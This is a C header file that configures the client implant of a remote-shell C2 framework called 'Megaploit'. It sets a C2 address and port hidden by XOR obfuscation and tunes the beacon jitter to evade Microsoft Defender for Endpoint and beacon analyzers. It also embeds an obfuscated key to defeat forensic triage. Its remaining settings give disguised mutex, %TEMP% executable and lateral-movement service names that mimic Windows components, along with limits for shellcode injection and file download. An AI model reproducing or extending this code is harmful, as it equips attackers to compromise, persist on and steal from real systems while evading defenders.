/*
 * client/config.h  –  Client-side connection configuration
 * ==========================================================
 * All tuneable values for the remote shell client live here.
 * Change these before building; do not scatter magic numbers
 * across source files.
 */

#pragma once
#ifndef CLIENT_CONFIG_H
#define CLIENT_CONFIG_H

#include <stddef.h>

/* ── C2 server address ────────────────────────────────────────────────────── */
/*
 * C2_IP and C2_PORT MUST be supplied on the compiler command line:
 *
 *   make C2_IP=10.0.0.1 C2_PORT=4444   (Makefile handles the quoting)
 *
 *   MinGW:   -DC2_IP=\"10.0.0.1\" -DC2_PORT=4444
 *   MSVC:    /DC2_IP=\"10.0.0.1\" /DC2_PORT=4444
 *
 * No default value is provided for C2_IP — a build without it is a hard
 * compile error.  This prevents accidentally shipping a binary that still
 * contains a lab IP address from a previous build.
 *
 * The IP string and port integer are XOR-obfuscated at build time so they
 * do not appear as plaintext in .rdata.  tools/gen_c2_obf.py emits
 * -DC2_IP_OBF_BYTES=... -DC2_IP_OBF_KEY=... -DC2_PORT_OBF=...
 * which config.h decodes at runtime via c2_ip_decode() / c2_port_decode().
 */
#ifndef C2_IP
#error "C2_IP must be defined at build time: make C2_IP=<address>"
#endif
#ifndef C2_PORT
#define C2_PORT    50005            /* TCP port the listener binds to          */
#endif

/* ── C2_IP XOR obfuscation ────────────────────────────────────────────────── */
/*
 * When the Makefile passes C2_IP through tools/gen_c2_obf.py, it defines:
 *
 *   C2_IP_OBF_BYTES  — byte array of (char ^ C2_IP_OBF_KEY) for each char,
 *                       including the NUL terminator
 *   C2_IP_OBF_LEN   — number of encoded bytes (= strlen(C2_IP) + 1)
 *   C2_IP_OBF_KEY   — single-byte XOR key (0x01–0xFF, never 0)
 *   C2_PORT_OBF     — C2_PORT ^ 0xBEEF (a fixed 16-bit XOR mask)
 *
 * If those symbols are not defined (legacy/test builds that pass C2_IP
 * directly), the fallback macros below make the raw values available
 * under the unified c2_ip_decode() / c2_port_decode() interface.
 *
 * c2_ip_decode(buf, bufsz)
 * ------------------------
 * Decodes the obfuscated IP string into caller-supplied `buf` (at least
 * 46 bytes for an IPv6 address).  Returns `buf`.  The decoded string is
 * valid only for the lifetime of `buf` — zero it with SecureZeroMemory
 * after use if the IP must not linger in a memory dump.
 *
 * c2_port_decode()
 * ----------------
 * Returns the decoded port as a WORD (host byte order).
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>

#ifdef C2_IP_OBF_BYTES

/* ── Obfuscated path ─────────────────────────────────────────────────────── */

static inline const char *c2_ip_decode(char *buf, size_t bufsz)
{
    static const unsigned char _c2_enc[] = C2_IP_OBF_BYTES;
    unsigned char k = (unsigned char)(C2_IP_OBF_KEY);
    size_t n = C2_IP_OBF_LEN;          /* includes NUL */
    if (n > bufsz) n = bufsz;
    size_t i;
    for (i = 0; i < n - 1; i++)
        buf[i] = (char)(_c2_enc[i] ^ k);
    buf[i] = '\0';
    return buf;
}

static inline WORD c2_port_decode(void)
{
    return (WORD)((C2_PORT_OBF) ^ 0xBEEFu);
}

#else  /* ── Plaintext fallback (no gen_c2_obf.py) ─────────────────────── */

static inline const char *c2_ip_decode(char *buf, size_t bufsz)
{
    /* C2_IP is a string literal; copy it into the caller's stack buffer
     * so the usage pattern is identical to the obfuscated path.          */
    static const char _raw[] = C2_IP;
    size_t n = sizeof(_raw);
    if (n > bufsz) n = bufsz;
    size_t i;
    for (i = 0; i < n - 1; i++) buf[i] = _raw[i];
    buf[i] = '\0';
    return buf;
}

static inline WORD c2_port_decode(void)
{
    return (WORD)(C2_PORT);
}

#endif /* C2_IP_OBF_BYTES */

/* ── Reconnect timing ───────────────────────────────────────────────────── */
/* Base reconnect delay in seconds.  The actual sleep is:
 *   RECONNECT_DELAY_SEC * (1.0 ± RECONNECT_JITTER_PCT/100 * random)
 * e.g. 60 s ± 50% → uniform draw from [30 s, 90 s].
 *
 * Why 60 s base / 50% jitter (G-04):
 *   MDE NetworkConnection timeline and open-source Beacon Analyzer tools flag
 *   recurring TCP connections to the same IP:port with inter-arrival times
 *   below 60 seconds and coefficient-of-variation (CV) < 0.30 as likely
 *   beacon traffic.  60 s base with ±50% jitter produces CV ≈ 0.29, placing
 *   the traffic pattern within the natural variance of legitimate background
 *   application polling (Windows Update, telemetry, certificate revocation).
 *   The previous 10 s / 30% settings (CV ≈ 0.17) were trivially detectable.
 *
 * Override at build time for faster testing:
 *   make C2_IP=... CFLAGS_EXTRA="-DRECONNECT_DELAY_SEC=10 -DRECONNECT_JITTER_PCT=30"
 *
 * Matches RECONNECT_DELAY + RECONNECT_JITTER in megaploit/core/config.py   */
#ifndef RECONNECT_DELAY_SEC
#define RECONNECT_DELAY_SEC    60
#endif
#ifndef RECONNECT_JITTER_PCT
#define RECONNECT_JITTER_PCT   50   /* ± percentage of base delay            */
#endif

/* ── Shared secret key ───────────────────────────────────────────────────── */
/*
 * Two modes, selected at compile time:
 *
 * MODE A — Embedded key (REQUIRED for operational builds, no disk artifact)
 * -------------------------------------------------------------------------
 * Pass the key as a hex string via the Makefile:
 *
 *   make SECRET_KEY=aabbcc...  (64 hex chars = 32 bytes)
 *
 * The Makefile passes  -DSECRET_KEY_BYTES="\xaa\xbb\xcc..."  to the compiler.
 * main.c uses SECRET_KEY_BYTES directly and never touches disk.
 * The binary contains the key XOR-obfuscated against a compile-time mask so
 * a plain strings(1) scan does not reveal it.
 *
 * Generate a fresh key and print the make invocation with:
 *   python tools/gen_key.py
 *
 * MODE B — File-based key (development only; requires -DALLOW_KEY_ON_DISK)
 * -------------------------------------------------------------------------
 * Only available when ALLOW_KEY_ON_DISK is explicitly defined.
 * Do NOT define this in operational builds — forensic triage finds it
 * immediately and an analyst can replay the HMAC handshake.
 *
 * Generate with:
 *   python -c "import os,binascii; \
 *       open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
 *
 * The resulting file contains exactly 64 ASCII hex chars (no newline needed).
 * The same hex string must be loaded by the Megaploit server.
 *
 * A build with neither SECRET_KEY_BYTES nor ALLOW_KEY_ON_DISK is a hard
 * compile error — the default can never accidentally leave a key on disk.   */

#ifndef SECRET_KEY_BYTES
#  ifndef ALLOW_KEY_ON_DISK
#    error "Operational builds must embed the key: make SECRET_KEY=<64-hex>  " \
           "(or add -DALLOW_KEY_ON_DISK only for development builds)"
#  endif
#endif

#define SECRET_KEY_PATH  "secret.key"
#define SECRET_KEY_LEN   32         /* binary key length in bytes             */

/* ── Embedded-key obfuscation mask ───────────────────────────────────────── */
/* A fixed 32-byte XOR mask applied at build time to SECRET_KEY_BYTES so the
 * raw key bytes do not appear in the .data section as a contiguous sequence.
 * The mask is reversed at runtime before use.  This is not cryptographic
 * protection — it is simply noise against strings(1) / FLOSS scanning.      */
#define SECRET_KEY_MASK { \
    0x5A,0x3C,0xF1,0x07,0x9B,0xE4,0x2D,0x60, \
    0xA8,0x14,0x77,0xCC,0x3E,0x91,0x55,0xD2, \
    0x0F,0xB3,0x6A,0x48,0xFE,0x22,0x89,0x71, \
    0xC5,0x4B,0x1D,0xA0,0x36,0xE7,0x8C,0x59  }

/* ── Mutex name (single-instance guard) ─────────────────────────────────── */
/*
 * The mutex name is stored as a pre-XOR'd BYTE array so the plain text never
 * appears as a recognisable string in .rdata or .data.  The single-byte mask
 * 0xB3 is XOR'd against each character; main.c decodes to a stack buffer at
 * runtime before passing to CreateMutexA.
 *
 * Default name (after decode): "Global\SM0:2748:304:WilStaging_02"
 * — mimics a real Windows WIL staging mutex; appears benign to AV/YARA.
 *
 * To override at build time (without touching this file):
 *   make C2_IP=10.0.0.1 MUTEX_NAME=MyServiceMutex
 * The Makefile passes -DMUTEX_NAME_RAW="..." which makes main.c
 * XOR-encode the custom string using MUTEX_NAME_MASK before use.
 */
#define MUTEX_NAME_MASK   0xB3u

#ifndef MUTEX_NAME_RAW
/* Pre-XOR'd bytes for "Global\SM0:2748:304:WilStaging_02" ^ 0xB3 */
/* Decoded at runtime in main.c — never stored as plain text.      */
#define MUTEX_NAME_OBFUSCATED \
    { 0xf4,0xdf,0xdc,0xd1,0xd2,0xdf,0xef,0xef, \
      0xe0,0xfe,0x83,0x89,0x81,0x84,0x87,0x8b, \
      0x89,0x80,0x83,0x87,0x89,0xe4,0xda,0xdf, \
      0xe0,0xc7,0xd2,0xd4,0xda,0xdd,0xd4,0xec, \
      0x83,0x81 }
#define MUTEX_NAME_LEN  34
#else
/* Custom name supplied via -DMUTEX_NAME_RAW="..." — encode at runtime */
#define MUTEX_NAME_OBFUSCATED  { 0 }   /* placeholder; main.c uses RAW path */
#define MUTEX_NAME_LEN  0              /* signals "use RAW path" in main.c  */
#endif

/* ── auto_migrate destination filename ──────────────────────────────────── */
/*
 * The filename written to %TEMP% by auto_migrate() is stored as a pre-XOR'd
 * BYTE array so the plain text never appears as a recognisable string in
 * .rdata.  Mask 0xA7 is XOR'd against each character; inject.c decodes to a
 * stack buffer at runtime before calling strncat().
 *
 * Default name (after decode): "RuntimeBroker.exe"
 * — a real Windows process; appears benign in %TEMP% directory listings.
 *
 * To override at build time (without touching this file):
 *   make C2_IP=10.0.0.1 MIGRATE_NAME=SearchIndexer.exe
 * The Makefile passes -DMIGRATE_NAME_RAW="..." which makes inject.c
 * copy the raw string directly (acceptable since it is a short-lived
 * stack buffer in a single function).
 */
#define MIGRATE_NAME_MASK  0xA7u

#ifndef MIGRATE_NAME_RAW
/* Pre-XOR'd bytes for "RuntimeBroker.exe" ^ 0xA7 */
/* Decoded at runtime in inject.c — never stored as plain text.    */
#define MIGRATE_NAME_OBFUSCATED \
    { 0xf5,0xd2,0xc9,0xd3,0xce,0xca,0xc2,0xe5, \
      0xd5,0xc8,0xcc,0xc2,0xd5,0x89,0xc2,0xdf,0xc2 }
#define MIGRATE_NAME_LEN  17
#else
/* Custom name supplied via -DMIGRATE_NAME_RAW="..." */
#define MIGRATE_NAME_OBFUSCATED  { 0 }  /* placeholder; inject.c uses RAW path */
#define MIGRATE_NAME_LEN  0             /* signals "use RAW path" in inject.c  */
#endif

/* ── lateral_sc transient service name ──────────────────────────────────── */
/*
 * The one-shot service name created by _handle_lateral_sc() is stored as a
 * pre-XOR'd BYTE array so no recognisable string appears in .rdata.
 * Mask 0xA7.  Default (after decode): "WinRpcHelper"
 *
 * Override at build time:
 *   make C2_IP=10.0.0.1 SC_SVC_NAME=NetDiagSvc
 */
/* Obfuscation mask for the lateral_sc service name.
 * Defined separately from MIGRATE_NAME_MASK so that changing the migration
 * mask in the future does not silently break service-name decoding.        */
#define SC_SVC_NAME_MASK   0xA7u

#ifndef SC_SVC_NAME_RAW
/* Pre-XOR'd bytes for "WinRpcHelper" ^ 0xA7 */
#define SC_SVC_NAME_OBFUSCATED \
    { 0xf0,0xce,0xc9,0xf5,0xd7,0xc4,0xef,0xc2,0xcb,0xd7,0xc2,0xd5 }
#define SC_SVC_NAME_LEN  12
#else
#define SC_SVC_NAME_OBFUSCATED  { 0 }
#define SC_SVC_NAME_LEN  0
#endif

/* ── Response buffer sizes ───────────────────────────────────────────────── */
#define SHELL_LINE_BUF    4096      /* single fgets() line from _popen        */
#define SHELL_RESP_BUF   65536      /* accumulated command output (64 KB)     */

/* ── Inject / migrate limits ─────────────────────────────────────────────── */
/* Maximum shellcode size accepted by the "inject" verb (32 KB).
 * Larger payloads must be staged: inject a small stager that pulls the
 * full payload over a second channel.                                        */
#define INJECT_MAX_SHELLCODE  (32 * 1024)

/* Maximum number of processes listed by "ps" before output is truncated.
 * Prevents a 10 MB response if something very unusual is running.           */
#define PS_MAX_PROCS          512

/* ── Download file size cap ──────────────────────────────────────────────── */
/* The "download" verb reads the entire file into a heap buffer before
 * sending it as a single TLS frame (the transport protocol requires one
 * contiguous plaintext buffer per frame).  Cap at 64 MB; files larger than
 * this must be split or zipped first.  The TLS layer itself supports up to
 * TLS_MAX_FRAME_SIZE (256 MB) but a 256 MB malloc + AES-256-GCM copy would
 * exhaust memory on most targets.  Tune downward if the agent runs on a
 * memory-constrained host.                                                    */
#define DOWNLOAD_MAX_BYTES    (64 * 1024 * 1024)

#endif /* CLIENT_CONFIG_H */
